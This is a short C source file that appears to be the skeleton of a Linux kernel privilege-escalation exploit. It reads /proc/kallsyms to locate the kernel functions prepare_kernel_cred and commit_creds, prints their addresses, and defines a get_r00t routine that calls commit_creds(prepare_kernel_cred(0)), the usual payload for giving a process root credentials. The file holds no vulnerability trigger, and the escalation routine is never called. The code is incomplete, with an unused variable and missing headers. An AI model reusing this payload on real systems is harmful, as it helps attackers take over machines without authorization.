#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>

void *get_symbol(char *name);
void get_r00t(void);
void seeker(void);

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));
typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

int
main()
{
  int fd;

  seeker();


}

void
seeker(void)
{
  prepare_kernel_cred	= get_symbol("prepare_kernel_cred");
  commit_creds		= get_symbol("commit_creds");

  if (!(prepare_kernel_cred && commit_creds))
    errx(1, "couldn't map kernel symbols");

  printf("[+] prepare_kernel_cred: %p\n", prepare_kernel_cred);
  printf("[+] commit_creds: %p\n", commit_creds);
}

void
get_r00t(void)
{
  commit_creds(prepare_kernel_cred(0));
}

/* Find a kernel symbol in /proc/kallsyms */
void *
get_symbol(char *name)
{
  FILE *f = fopen("/proc/kallsyms", "r");
  char c, sym[512];
  void *addr;
  int ret;

  while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
    if (!strcmp(sym, name))
      return addr;
  }

  return NULL;
}
